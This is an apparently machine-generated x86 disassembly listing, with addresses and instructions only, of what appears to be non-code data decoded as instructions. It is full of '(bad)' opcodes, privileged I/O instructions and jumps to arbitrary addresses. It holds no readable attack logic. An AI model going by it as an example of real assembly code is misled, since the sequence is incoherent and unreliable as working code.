  40a08f:	mov    dl,0xbc
  40a091:	inc    ebx
  40a092:	iret   
  40a093:	js     0x40a0e3
  40a095:	out    0xb5,al
  40a097:	ret    0x1270
  40a09a:	push   cs
  40a09b:	outs   dx,BYTE PTR ds:[esi]
  40a09c:	xor    eax,0xbef42046
  40a0a1:	sbb    ebp,DWORD PTR [ecx+0x15]
  40a0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0a5:	pop    eax
  40a0a6:	call   0xd0762718
  40a0ab:	xor    eax,0xabf06afa
  40a0b0:	ret    
  40a0b1:	xchg   BYTE PTR [edi+0x6abfeebf],bl
  40a0b7:	in     eax,dx
  40a0b8:	out    dx,eax
  40a0b9:	sar    BYTE PTR [edx-0x75],cl
  40a0bc:	aaa    
  40a0bd:	sbb    cl,cl
  40a0bf:	test   al,0x1a
  40a0c2:	lods   al,BYTE PTR ds:[esi]
  40a0c3:	loope  0x40a0a3
  40a0c5:	sub    DWORD PTR [esi-0x5bcfc0c],ecx
  40a0cb:	aad    0x2c
  40a0cd:	sti    
  40a0ce:	mov    DWORD PTR [eax],esp
  40a0d0:	jge    0x40a0c3
  40a0d2:	clc    
  40a0d3:	jae    0x40a13d
  40a0d5:	mov    ah,0xd1
  40a0d7:	dec    edi
  40a0d8:	pop    ebx
  40a0d9:	ret    0xeb93
  40a0dc:	sbb    BYTE PTR [esi+eiz*1-0x54],cl
  40a0e0:	adc    BYTE PTR [ecx],0x5b
  40a0e3:	push   0x3eaf342a
  40a0e8:	je     0x40a152
  40a0ea:	push   esi
  40a0eb:	mov    BYTE PTR [edx+0x3986f68c],bh
  40a0f1:	(bad)  
  40a0f2:	xor    bh,BYTE PTR [ebx-0x5d0492f1]
  40a0f8:	jbe    0x40a0fa
  40a0fa:	sub    BYTE PTR [esi-0x9c3c0e3],bl
  40a100:	out    dx,al
  40a101:	mul    BYTE PTR [esp+edi*2]
  40a104:	and    al,0xd8
  40a106:	retf   
  40a107:	ftst   
  40a109:	test   eax,0x89859e50
  40a10e:	clc    
  40a10f:	jp     0x40a0e5
  40a111:	pop    ds
  40a112:	adc    cl,0x1
  40a115:	or     eax,DWORD PTR [ebp+0x7055eaa5]
  40a11b:	adc    al,0x1f
  40a11d:	mul    DWORD PTR [edx+0xa]
  40a120:	ss mov eax,0x3930a7e5
  40a126:	xchg   ebx,eax
  40a127:	imul   esp,DWORD PTR [ebx-0x5994024a],0xcd70175f
  40a131:	in     eax,dx
  40a132:	adc    dh,BYTE PTR [edi+0x2a]
  40a135:	mov    eax,ss:0x58c3498
  40a13b:	fnstcw WORD PTR [eax-0x759a5b5c]
  40a141:	es sub al,0x9a
  40a144:	sti    
  40a145:	add    esp,DWORD PTR [ecx-0x16aa57da]
  40a14b:	adc    BYTE PTR ds:0xac39f72,dl
  40a151:	or     edx,DWORD PTR [ebx-0x133de5d7]
  40a157:	and    BYTE PTR [edx+0x8436dce],ah
  40a15d:	pushf  
  40a15e:	xor    al,0xc0
  40a160:	jae    0x40a1c1
  40a162:	iret   
  40a163:	xchg   esp,eax
  40a164:	enter  0x8763,0x8a
  40a168:	dec    ebp
  40a169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a16a:	xchg   ecx,eax
  40a16b:	jmp    0x40a10a
  40a16d:	jmp    0x40a0fa
  40a16f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a170:	or     al,0xc5
  40a172:	ror    BYTE PTR es:[ebp-0x76],0xe2
  40a177:	aam    0x11
  40a179:	pminsw mm0,mm7
  40a17c:	cld    
  40a17d:	dec    esi
  40a17e:	jecxz  0x40a1ed
  40a180:	mov    dl,0xc7
  40a182:	xor    DWORD PTR [ebx+eiz*2-0x74],esi
  40a186:	neg    BYTE PTR ds:0xfed910da
  40a18c:	dec    ebp
  40a18d:	in     al,0xc5
  40a18f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a190:	mov    ds:0xaad2d15b,al
  40a195:	js     0x40a1aa
  40a197:	test   BYTE PTR es:[edi-0x603436],dh
  40a19e:	push   es
  40a19f:	sub    BYTE PTR [ecx+0x4a4938fa],0xec
  40a1a6:	push   0x7e06103
  40a1ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1ac:	push   edx
  40a1ad:	sbb    cl,BYTE PTR [eax+0x5b]
  40a1b0:	nop
  40a1b1:	pop    esi
  40a1b2:	aam    0x5a
  40a1b4:	icebp  
  40a1b5:	fdivrp st(5),st
  40a1b7:	or     BYTE PTR [ebx-0x1482c2fc],cl
  40a1bd:	inc    ebx
  40a1be:	mov    ds:0x9351e5fe,al
  40a1c3:	cs xchg edi,eax
  40a1c5:	push   esi
  40a1c6:	sar    BYTE PTR [edx-0x49d6e662],cl
  40a1cc:	xor    DWORD PTR [edx-0x14],esp
  40a1cf:	xor    ch,cl
  40a1d1:	loope  0x40a1ef
  40a1d3:	into   
  40a1d4:	mov    cs,ebx
  40a1d6:	jo     0x40a1ba
  40a1d8:	push   0xffffff9f
  40a1da:	clc    
  40a1db:	bound  edx,QWORD PTR [ebx+0x4a]
  40a1de:	shl    DWORD PTR [esi],cl
  40a1e0:	xor    DWORD PTR [edi],ecx
  40a1e2:	and    DWORD PTR [ebp-0x3e9ec20c],ebp
  40a1e8:	push   eax
  40a1e9:	add    al,0x99
  40a1eb:	adc    DWORD PTR [esi+esi*4-0x55],ebx
  40a1ef:	outs   dx,BYTE PTR ds:[esi]
  40a1f0:	inc    ecx
  40a1f1:	and    BYTE PTR [eax+esi*8+0x3e387a7b],bh
  40a1f8:	ret    0xb896
  40a1fb:	icebp  
  40a1fc:	jge    0x40a187
  40a1fe:	neg    DWORD PTR [ebp+0x5a]
  40a201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a202:	push   eax
  40a203:	sbb    eax,0x4e3b4cb
  40a208:	mov    al,ds:0x47f69f57
  40a20d:	fstp   QWORD PTR [eax+0x14986562]
  40a213:	out    0x71,al
  40a215:	rcl    DWORD PTR [eax+0x5ac478a5],0x21
  40a21c:	ins    BYTE PTR es:[edi],dx
  40a21d:	push   0x7e932468
  40a222:	jl     0x40a285
  40a224:	inc    esi
  40a225:	(bad)  
  40a226:	mov    edi,esi
  40a228:	bound  edi,QWORD PTR [ebx-0x14d52570]
  40a22e:	mov    eax,?
  40a230:	shl    al,1
  40a232:	sub    al,BYTE PTR [ebx-0x30]
  40a235:	imul   ecx,DWORD PTR [esi],0x1c
  40a238:	xchg   ebx,eax
  40a239:	(bad)  
  40a23a:	and    cl,BYTE PTR [ebp-0x20]
  40a23d:	add    eax,0x92fc8712
  40a242:	and    ch,dh
  40a244:	jl     0x40a2b9
  40a246:	daa    
  40a247:	sbb    ah,BYTE PTR [edi]
  40a249:	js     0x40a233
  40a24b:	nop
  40a24c:	pop    edi
  40a24d:	rcr    BYTE PTR [ecx],cl
  40a24f:	fwait
  40a250:	jle    0x40a221
  40a252:	fiadd  WORD PTR [ebx]
  40a254:	push   ss
  40a255:	sub    BYTE PTR [edi+0x7c],bh
  40a258:	pop    esp
  40a259:	pop    ds
  40a25a:	popf   
  40a25b:	ficomp WORD PTR [ecx]
  40a25d:	out    0x59,al
  40a25f:	jmp    0xf5c71249
  40a264:	aad    0xb1
  40a266:	out    dx,eax
  40a267:	das    
  40a268:	xor    DWORD PTR [edx-0x676cc36],ecx
  40a26e:	ins    DWORD PTR es:[edi],dx
  40a26f:	push   esp
  40a270:	xor    WORD PTR [ebx+0x4d28f651],si
  40a277:	inc    edx
  40a278:	enter  0x3f51,0x12
  40a27c:	dec    edx
  40a27d:	daa    
  40a27e:	xor    ebp,DWORD PTR [ebx+0x35]
  40a281:	mov    ch,0x6d
  40a283:	jmp    FWORD PTR [ecx]
  40a285:	sbb    DWORD PTR [eax-0x4586ed93],ecx
  40a28b:	rcl    DWORD PTR [edi],0x5
  40a28e:	lds    edi,FWORD PTR [ecx-0x22fc0915]
  40a294:	inc    ebp
  40a295:	enter  0xd8f2,0x21
  40a299:	mov    esi,0x33c834f4
  40a29e:	xchg   edi,eax
  40a29f:	je     0x40a2ca
  40a2a1:	scas   al,BYTE PTR es:[edi]
  40a2a2:	fwait
  40a2a3:	aad    0xd5
  40a2a5:	es adc eax,0xccccf2fd
  40a2ab:	les    ebx,FWORD PTR [edi]
  40a2ad:	dec    edi
  40a2ae:	lahf   
  40a2af:	arpl   WORD PTR [edi+0x60],bp
  40a2b2:	push   edx
  40a2b3:	int    0x76
  40a2b5:	loop   0x40a265
  40a2b7:	add    eax,0xef212758
  40a2bc:	jne    0x40a327
  40a2be:	cli    
  40a2bf:	data16 mov cl,0xa3
  40a2c2:	daa    
  40a2c3:	pop    ebp
  40a2c4:	adc    eax,0x6bda75ba
  40a2c9:	cmp    eax,0x3c139fd8
  40a2ce:	fld    TBYTE PTR [ebx]
  40a2d0:	in     al,dx
  40a2d1:	push   esp
  40a2d2:	xor    DWORD PTR ds:0x97578b8f,edx
  40a2d8:	in     al,dx
  40a2d9:	sahf   
  40a2da:	sub    BYTE PTR [ecx],dh
  40a2dc:	mov    esi,0xa6e379b
  40a2e1:	sub    cl,BYTE PTR [ecx]
  40a2e3:	scas   eax,DWORD PTR es:[edi]
  40a2e4:	push   edx
  40a2e5:	fcomp  QWORD PTR [edx-0x3d]
  40a2e8:	sub    bh,BYTE PTR [esi-0x10f38d2a]
  40a2ee:	(bad)  
  40a2ef:	outs   dx,DWORD PTR ds:[esi]
  40a2f0:	ja     0x40a29e
  40a2f2:	cmp    edx,0xaad51092
  40a2f8:	sbb    DWORD PTR [esi+0x689a3beb],esi
  40a2fe:	jg     0x40a2f0
  40a300:	cmp    eax,0x93333f19
  40a305:	test   dh,ah
  40a307:	scas   eax,DWORD PTR es:[edi]
  40a308:	mov    esp,0x88dea840
  40a30d:	inc    esi
  40a30e:	push   esp
  40a30f:	mov    WORD PTR [ecx+eax*1],fs
  40a312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a313:	iret   
  40a314:	lods   eax,DWORD PTR ds:[esi]
  40a315:	jmp    0x3d67b40f
  40a31a:	mov    ch,0xe
  40a31c:	cmp    DWORD PTR [ebp-0x70],edx
  40a31f:	data16 mov cl,0xaa
  40a322:	shl    edx,cl
  40a324:	cmp    eax,DWORD PTR [ecx+ecx*1+0xb]
  40a328:	pop    DWORD PTR [ebp-0x2e349c0a]
  40a32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a32f:	pushf  
  40a330:	mov    bl,0xb1
  40a332:	fs enter 0x94cb,0x24
  40a337:	iret   
  40a338:	jnp    0x40a341
  40a33a:	jns    0x40a305
  40a33c:	pushf  
  40a33d:	test   BYTE PTR [ebx],0x38
  40a340:	out    0x65,eax
  40a342:	daa    
  40a343:	call   FWORD PTR [ebx+edx*8]
  40a346:	repnz dec edi
  40a348:	jnp    0x40a3bf
  40a34a:	add    esi,edi
  40a34c:	xchg   esp,eax
  40a34d:	imul   ebx,esp,0xfffffffb
  40a350:	pop    ss
  40a351:	pop    es
  40a352:	les    ecx,FWORD PTR [ebx]
  40a354:	fwait
  40a355:	add    BYTE PTR [ebp-0x3e],bh
  40a358:	dec    esp
  40a359:	push   0xffffff95
  40a35b:	xchg   BYTE PTR [ebx],dl
  40a35d:	shr    BYTE PTR [eax+0x79],cl
  40a360:	retf   
  40a361:	icebp  
  40a362:	retf   0xf547
  40a365:	fsub   DWORD PTR [ebp+0xe621140]
  40a36b:	adc    BYTE PTR [edi+0x7216a08d],0xd2
  40a372:	xchg   esi,eax
  40a373:	popf   
  40a374:	ret    
  40a375:	jbe    0x40a3b0
  40a377:	pop    edx
  40a378:	pop    edi
  40a379:	sub    cl,cl
  40a37b:	sub    eax,ebp
  40a37d:	scas   al,BYTE PTR es:[edi]
  40a37e:	jecxz  0x40a3a7
  40a380:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40a382:	inc    edi
  40a383:	or     eax,0x4e1d4a9
  40a388:	jge    0x40a390
  40a38a:	imul   ebp,eax,0xffffff81
  40a38d:	std    
  40a38e:	aas    
  40a38f:	dec    esp
  40a390:	pop    ecx
  40a391:	inc    ecx
  40a392:	add    eax,0x4edff03d
  40a397:	outs   dx,BYTE PTR ds:[esi]
  40a398:	dec    esp
  40a399:	jge    0x40a346
  40a39b:	retf   0xded6
  40a39e:	test   bh,ah
  40a3a0:	mov    dl,0xd0
  40a3a2:	push   edx
  40a3a3:	add    al,0x8a
  40a3a5:	mov    al,ds:0xc945527b
  40a3aa:	mov    WORD PTR [ecx+0x18],ss
  40a3ad:	sub    BYTE PTR [edx-0x3fdc32d6],0x29
  40a3b4:	hlt    
  40a3b5:	jo     0x40a3bf
  40a3b7:	test   eax,0xd50921ae
  40a3bc:	sub    eax,0x72177ef
  40a3c1:	sub    ch,BYTE PTR [esi-0xa]
  40a3c4:	mov    ebx,0x1b78a785
  40a3c9:	or     al,0x26
  40a3cb:	jnp    0x40a362
  40a3cd:	aam    0x74
  40a3cf:	sub    BYTE PTR [eax+0x15367be4],ah
  40a3d5:	into   
  40a3d6:	daa    
  40a3d7:	shl    BYTE PTR [ecx+0x14],0x31
  40a3db:	inc    ebp
  40a3dc:	sti    
  40a3dd:	sub    al,0xc4
  40a3df:	xchg   ecx,eax
  40a3e0:	cs mov ?,esi
  40a3e3:	retf   
  40a3e4:	fs and ecx,eax
  40a3e7:	dec    eax
  40a3e8:	dec    esp
  40a3e9:	es hlt 
  40a3eb:	or     bh,bl
  40a3ed:	push   ss
  40a3ee:	hlt    
  40a3ef:	loop   0x40a455
  40a3f1:	sub    DWORD PTR [esi-0x51],ebp
  40a3f4:	add    al,0x99
  40a3f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3f7:	(bad)  
  40a3f8:	imul   edi,DWORD PTR [ebx+0x4f7576d7],0x37
  40a3ff:	daa    
  40a400:	(bad)  
  40a402:	popa   
  40a403:	push   cs
  40a404:	dec    ebp
  40a405:	xor    cl,BYTE PTR [ecx-0x2b12a4a2]
  40a40b:	inc    edi
  40a40c:	dec    esp
  40a40d:	push   cs
  40a40e:	push   ss
  40a40f:	imul   esi,ebx,0x8f3d789
  40a415:	jl     0x40a3bc
  40a417:	adc    al,ch
  40a419:	inc    ecx
  40a41a:	cmp    ch,BYTE PTR [ebx]
  40a41c:	(bad)  
  40a41d:	and    eax,0xe12798cb
  40a422:	add    al,0x3e
  40a424:	enter  0x7c13,0x8c
  40a428:	adc    DWORD PTR [edx+0x5f],0xffffffd8
  40a42c:	es out 0x59,al
  40a42f:	xchg   esi,eax
  40a430:	xchg   ebx,eax
  40a431:	dec    ebp
  40a432:	loopne 0x40a43c
  40a434:	call   0xb29cd84b
  40a439:	dec    esp
  40a43a:	adc    eax,0x4b7077d4
  40a43f:	sbb    al,0xfd
  40a441:	mov    cl,bh
  40a443:	add    eax,DWORD PTR [ebp+0x6ef6ea91]
  40a449:	sub    dl,ch
  40a44b:	or     BYTE PTR [ebx-0x55],bh
  40a44e:	jle    0x40a415
  40a450:	loope  0x40a421
  40a452:	out    dx,al
  40a453:	lods   eax,DWORD PTR ds:[esi]
  40a454:	inc    edi
  40a455:	pop    edx
  40a456:	jl     0x40a461
  40a458:	cmp    DWORD PTR [ecx],0x5dbfcfc
  40a45e:	jns    0x40a49e
  40a460:	xor    eax,0x448fdc9a
  40a465:	enter  0xe051,0xd9
  40a469:	mov    ds:0xedd40091,al
  40a46e:	ins    DWORD PTR es:[edi],dx
  40a46f:	enter  0x27f7,0x20
  40a473:	enter  0x8548,0xe9
  40a477:	inc    ecx
  40a478:	adc    al,0x6d
  40a47a:	or     esp,ecx
  40a47c:	and    esi,ebx
  40a47e:	icebp  
  40a47f:	push   0x18
  40a481:	and    eax,0x6c250c45
  40a486:	icebp  
  40a487:	mov    es,WORD PTR [ebx-0x6a22c977]
  40a48d:	pop    ebx
  40a48e:	xchg   ebp,eax
  40a48f:	and    eax,0xd14b9cb8
  40a494:	jl     0x40a48c
  40a496:	iret   
  40a497:	dec    ebx
  40a498:	push   esp
  40a499:	xor    al,0x28
  40a49b:	call   DWORD PTR [edi+edi*4-0x755bb770]
  40a4a2:	jmp    0x4873e4d5
  40a4a7:	daa    
  40a4a8:	adc    edx,DWORD PTR [edi-0x46]
  40a4ab:	(bad)  
  40a4ac:	out    dx,eax
  40a4ad:	leave  
  40a4ae:	add    ah,al
  40a4b0:	mov    eax,DWORD PTR [ebp+0x5d]
  40a4b3:	das    
  40a4b4:	pop    ss
  40a4b5:	add    ebp,esp
  40a4b7:	inc    ebx
  40a4b8:	int    0xee
  40a4ba:	mov    eax,ds:0x23eb569d
  40a4bf:	inc    esi
  40a4c0:	mov    cl,0xb8
  40a4c2:	mov    ah,0x8b
  40a4c4:	xchg   edi,eax
  40a4c5:	or     bl,BYTE PTR [ecx]
  40a4c7:	repnz lods al,BYTE PTR ds:[esi]
  40a4c9:	sbb    bl,BYTE PTR [edi+0x64]
  40a4cc:	sub    dh,BYTE PTR [edi+0x1219bfdd]
  40a4d2:	lea    edi,fs:[esp+esi*2-0x72]
  40a4d7:	fwait
  40a4d8:	push   ebp
  40a4d9:	mov    ah,0x1f
  40a4db:	sbb    DWORD PTR [eax+eax*1-0x5799b571],ebp
  40a4e2:	cs test al,0x88
  40a4e5:	dec    ebp
  40a4e6:	fstp   TBYTE PTR [esi-0xd]
  40a4e9:	mov    ecx,0x10180121
  40a4ee:	cli    
  40a4ef:	or     al,0x9e
  40a4f1:	push   ecx
  40a4f2:	pxor   mm5,QWORD PTR [ebp+0xe]
  40a4f6:	sti    
  40a4f7:	iret   
  40a4f8:	jmp    0x9a35:0xfa13b03a
  40a4ff:	sbb    al,0xad
  40a501:	and    BYTE PTR [edx-0x2b842713],al
  40a507:	xchg   esp,eax
  40a508:	(bad)  
  40a509:	push   ebp
  40a50a:	nop
  40a50b:	out    0x5e,eax
  40a50d:	mov    ebp,0x13fc8d77
  40a512:	jp     0x40a4c9
  40a514:	adc    BYTE PTR [eax+0x12137b0],0x37
  40a51b:	dec    edx
  40a51c:	add    BYTE PTR [ecx],bh
  40a51e:	mov    ah,0x13
  40a520:	mov    edx,esp
  40a522:	repz cli 
  40a524:	call   0x1f5e:0xad3bc1b1
  40a52b:	ja     0x40a592
  40a52d:	inc    ebp
  40a52e:	je     0x40a586
  40a530:	sub    ecx,esp
  40a532:	(bad)  
  40a533:	mov    ebx,0x5354e9db
  40a538:	jmp    0x40a524
  40a53a:	inc    eax
  40a53b:	or     DWORD PTR [ebx-0x5f],esi
  40a53e:	adc    al,BYTE PTR [edi+0x54]
  40a541:	inc    ebp
  40a542:	push   eax
  40a543:	ja     0x40a4ea
  40a545:	push   ss
  40a546:	mov    bl,0x24
  40a548:	js     0x40a579
  40a54a:	xchg   esp,edx
  40a54c:	adc    al,0x93
  40a54e:	xchg   esi,eax
  40a54f:	pusha  
  40a550:	pop    esi
  40a551:	enter  0x1ca4,0x50
  40a555:	cmp    eax,0x2b61bf39
  40a55a:	cld    
  40a55b:	push   ecx
  40a55c:	loope  0x40a533
  40a55e:	pop    esi
  40a55f:	inc    edi
  40a560:	lea    ebx,[esi-0x25]
  40a563:	or     eax,0x9c36af58
  40a568:	inc    eax
  40a569:	cmp    cl,BYTE PTR [ebx+0x24]
  40a56c:	xlat   BYTE PTR ds:[ebx]
  40a56d:	pushf  
  40a56e:	bound  edx,QWORD PTR [edx-0x7a]
  40a571:	xor    DWORD PTR [ebx-0x3b92a18f],0xa90047f1
  40a57b:	mov    dl,dl
  40a57d:	sahf   
  40a57e:	(bad)  
  40a57f:	pop    edx
  40a580:	or     WORD PTR [edi-0x5],dx
  40a584:	jecxz  0x40a526
  40a586:	fs sti 
  40a588:	mov    al,0x31
  40a58a:	pusha  
  40a58b:	xor    edi,DWORD PTR [eax+0x6388931f]
  40a591:	xor    edi,DWORD PTR [edi+ecx*8]
  40a594:	push   cs
  40a595:	dec    esp
  40a596:	xor    BYTE PTR [eax],0xb7
  40a599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a59a:	sbb    eax,0x6a373c26
  40a59f:	mov    cl,0xc1
  40a5a1:	xor    eax,0xe9c8393d
  40a5a6:	jecxz  0x40a56c
  40a5a8:	push   cs
  40a5a9:	sbb    dl,0x86
  40a5ac:	or     ch,cl
  40a5ae:	inc    esi
  40a5af:	inc    eax
  40a5b0:	jmp    0x4c608d9
  40a5b5:	fisub  DWORD PTR [edx+0x4d]
  40a5b8:	sar    DWORD PTR [ebx-0x75],1
  40a5bb:	sub    al,0x1b
  40a5bd:	xchg   BYTE PTR [esi],cl
  40a5bf:	(bad)  
  40a5c0:	mov    esp,0x4faa8beb
  40a5c5:	xchg   ebx,eax
  40a5c6:	inc    esi
  40a5c7:	xlat   BYTE PTR ds:[ebx]
  40a5c8:	stos   DWORD PTR es:[edi],eax
  40a5c9:	dec    esp
  40a5ca:	jp     0x40a5b2
  40a5cc:	mov    bh,0x22
  40a5ce:	pop    esi
  40a5cf:	inc    ebx
  40a5d0:	mov    cl,0x4c
  40a5d2:	or     BYTE PTR [edi+0x2c41c7b3],dh
  40a5d8:	sbb    cl,BYTE PTR [edx]
  40a5da:	lock sub eax,0xd53a151c
  40a5e0:	(bad)  
  40a5e1:	xlat   BYTE PTR ds:[ebx]
  40a5e2:	sub    bh,BYTE PTR [ecx-0x63]
  40a5e5:	xor    BYTE PTR [edx],al
  40a5e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5e8:	leave  
  40a5e9:	cmp    esp,DWORD PTR [ebx+eiz*4]
  40a5ec:	xor    ah,ah
  40a5ee:	and    BYTE PTR [ebx-0x30],al
  40a5f1:	sbb    al,0x70
  40a5f3:	push   edi
  40a5f4:	cmc    
  40a5f5:	sbb    edx,DWORD PTR [edi-0x3c]
  40a5f8:	test   al,0xdd
  40a5fa:	test   eax,0xf6b4ac6b
  40a5ff:	pop    ecx
  40a600:	mov    ecx,0xb93bfc0b
  40a605:	icebp  
  40a606:	popf   
  40a607:	cmp    BYTE PTR [edx-0x1d],0x1a
  40a60b:	repnz mov WORD PTR [edx],fs
  40a60e:	call   0x17a3d1a7
  40a613:	sbb    al,0xc0
  40a615:	push   ds
  40a616:	inc    eax
  40a617:	jnp    0x40a641
  40a619:	pop    es
  40a61a:	sbb    DWORD PTR [esi],ebp
  40a61c:	cmp    esi,esp
  40a61e:	sbb    BYTE PTR [esi+0x74dccc63],bh
  40a624:	test   ebp,0x42dc097
  40a62a:	(bad)  
  40a62b:	clc    
  40a62c:	xchg   esi,eax
  40a62d:	aad    0x1d
  40a62f:	pop    edi
  40a630:	sub    DWORD PTR [ecx],esi
  40a632:	add    al,0xb5
  40a634:	jno    0x40a687
  40a636:	and    eax,ebp
  40a638:	sub    al,0xd5
  40a63a:	fdiv   DWORD PTR [esi]
  40a63c:	or     al,0xc1
  40a63e:	rcl    BYTE PTR [esi+0x5a5242ec],cl
  40a644:	(bad)  
  40a645:	xor    DWORD PTR ds:0x5d8b0c93,ecx
  40a64b:	and    DWORD PTR [eax+0x2b93fdec],ebp
  40a651:	es out 0x9f,al
  40a654:	add    al,0x8a
  40a656:	xor    al,0xe5
  40a658:	aad    0xb2
  40a65a:	arpl   WORD PTR [edx+0x31a43f02],bx
  40a660:	ja     0x40a655
  40a662:	or     eax,0xbdc286d2
  40a667:	test   BYTE PTR [ecx+0x36],bh
  40a66a:	mov    ebx,0xcba8d78d
  40a66f:	dec    eax
  40a670:	adc    esp,edx
  40a672:	jp     0x40a635
  40a674:	push   ecx
  40a675:	add    DWORD PTR [edx],0xffffff88
  40a678:	pop    edi
  40a679:	jmp    0xbfb9b1fc
  40a67e:	sbb    eax,0x26c75ac0
  40a683:	nop
  40a684:	mov    ds:0x18e97620,eax
  40a689:	imul   edx,edi,0x95b51a28
  40a68f:	xchg   esp,eax
  40a690:	or     al,BYTE PTR [edx+edx*4-0x40c0b9f8]
  40a697:	pop    eax
  40a698:	and    DWORD PTR [eax+0x39513e12],0xd919fa64
  40a6a2:	jl     0x40a669
  40a6a4:	mov    ah,0xf2
  40a6a6:	cli    
  40a6a7:	rcl    DWORD PTR [eax-0x36],0x40
  40a6ab:	lock sub al,cl
  40a6ae:	bound  edx,QWORD PTR [ebp-0x4f]
  40a6b1:	pop    ds
  40a6b2:	jnp    0x40a6f6
  40a6b4:	pop    edx
  40a6b5:	shr    DWORD PTR [ecx+0x74282184],0x5e
  40a6bc:	inc    edi
  40a6bd:	ja     0x40a72c
  40a6bf:	dec    edx
  40a6c0:	inc    DWORD PTR [edi+0x43]
  40a6c3:	call   0xdbab:0x54981bd1
  40a6ca:	cdq    
  40a6cb:	clc    
  40a6cc:	push   cs
  40a6cd:	push   cs
  40a6ce:	stc    
  40a6cf:	and    BYTE PTR [eax+0x2a],cl
  40a6d2:	outs   dx,DWORD PTR ds:[esi]
  40a6d3:	cmp    eax,0x8528f27a
  40a6d8:	(bad)  
  40a6d9:	mov    eax,ds:0x1f975de5
  40a6de:	nop
  40a6df:	leave  
  40a6e0:	out    0xce,eax
  40a6e2:	cwde   
  40a6e3:	loopne 0x40a70b
  40a6e5:	shl    edx,0x25
  40a6e8:	mov    cl,0x2a
  40a6ea:	jge    0x40a723
  40a6ec:	lods   al,BYTE PTR ds:[esi]
  40a6ed:	mov    ds:0xd420755e,al
  40a6f2:	push   ss
  40a6f3:	nop
  40a6f4:	xchg   ebp,eax
  40a6f5:	sub    esi,esi
  40a6f7:	and    al,0x1c
  40a6f9:	pushf  
  40a6fa:	jns    0x40a6fa
  40a6fc:	hlt    
  40a6fd:	jmp    0xf13d1d54
  40a702:	fs aad 0x4e
  40a705:	loope  0x40a6fd
  40a707:	xchg   ebx,eax
  40a708:	pop    ebx
  40a709:	dec    edx
  40a70a:	sub    al,0x61
  40a70c:	cmp    BYTE PTR [ecx+0x17ad7a18],ah
  40a712:	test   al,0x46
  40a714:	adc    DWORD PTR [ebx-0x6d9d3d21],ebp
  40a71a:	enter  0xf18a,0x4d
  40a71e:	jbe    0x40a6c2
  40a720:	mov    eax,DWORD PTR [edi+0x392e5dd4]
  40a726:	dec    esi
  40a727:	fadd   QWORD PTR [ebp-0x5d]
  40a72a:	call   0xe6493dd2
  40a72f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a730:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40a732:	sbb    eax,0x1188b1a1
  40a737:	push   edx
  40a738:	mov    BYTE PTR [edx],bh
  40a73a:	sub    eax,0x1ce06882
  40a73f:	mov    esp,0xd1872422
  40a744:	jmp    0x40a7c0
  40a746:	and    al,0x48
  40a748:	retf   
  40a749:	push   ss
  40a74a:	stos   BYTE PTR es:[edi],al
  40a74b:	aad    0x1d
  40a74d:	cmp    esi,esi
  40a74f:	aas    
  40a750:	xchg   ebp,eax
  40a751:	dec    edx
  40a752:	and    al,0x5
  40a754:	and    ebx,ecx
  40a756:	mov    edx,0x9f8cda19
  40a75b:	cmp    al,0x4c
  40a75d:	jae    0x40a7a7
  40a75f:	out    0x0,al
  40a761:	xchg   ebp,esp
  40a763:	push   ebp
  40a764:	sets   BYTE PTR [eax-0x35720583]
  40a76b:	ds sbb ecx,esi
  40a76e:	jne    0x40a7da
  40a770:	fsub   QWORD PTR [eax-0x343b859]
  40a776:	test   al,0x8f
  40a778:	mov    ebp,0xa0d39c6
  40a77d:	pusha  
  40a77e:	in     al,0x30
  40a780:	mov    ds:0xc47ce759,al
  40a785:	push   eax
  40a786:	inc    edx
  40a787:	ins    BYTE PTR es:[edi],dx
  40a788:	sub    BYTE PTR [esi-0x1b],ch
  40a78b:	pop    ebx
  40a78c:	repnz and cl,BYTE PTR [edi]
  40a78f:	aam    0x4a
  40a791:	call   esp
  40a793:	xchg   edi,eax
  40a794:	dec    ecx
  40a795:	sahf   
  40a796:	sti    
  40a797:	xchg   ebp,eax
  40a798:	sbb    BYTE PTR [edx+0x383a8b2],bl
  40a79e:	or     BYTE PTR ds:0xa04dc232,bh
  40a7a4:	push   edi
  40a7a5:	repnz jecxz 0x40a7e2
  40a7a8:	xchg   edx,eax
  40a7aa:	sbb    al,ch
  40a7ac:	mov    sp,0xd112
  40a7b0:	and    esp,DWORD PTR [eax]
  40a7b2:	mov    edx,0x4b363b7f
  40a7b7:	loope  0x40a73d
  40a7b9:	(bad)  
  40a7ba:	xor    dh,BYTE PTR [esi-0x6688cbcd]
  40a7c0:	mov    ds:0x98cf437,al
  40a7c5:	inc    edx
  40a7c6:	inc    ecx
  40a7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7c8:	pop    eax
  40a7c9:	icebp  
  40a7ca:	sbb    eax,esi
  40a7cc:	inc    DWORD PTR gs:[ebx]
  40a7cf:	loopne 0x40a782
  40a7d1:	hlt    
  40a7d2:	sbb    eax,0x7cd079c4
  40a7d7:	mov    DWORD PTR [edi],edx
  40a7d9:	mov    esp,0xdb14098a
  40a7de:	mov    esp,0xaad80c50
  40a7e3:	xor    al,0xf2
  40a7e5:	je     0x40a84e
  40a7e7:	add    edx,DWORD PTR [eax]
  40a7e9:	stos   BYTE PTR es:[edi],al
  40a7ea:	sbb    DWORD PTR [ebp+0x24],edi
  40a7ed:	cmc    
  40a7ee:	outs   dx,BYTE PTR ds:[esi]
  40a7ef:	or     esp,DWORD PTR [ecx+0x79551edf]
  40a7f5:	cmp    dh,BYTE PTR [ebx]
  40a7f7:	rcr    DWORD PTR [edx+ebx*2-0x1fa45344],1
  40a7fe:	mov    ah,0x72
  40a800:	sbb    esi,eax
  40a802:	and    eax,0x97ec6f40
  40a807:	jecxz  0x40a7e8
  40a809:	les    esp,FWORD PTR [edi]
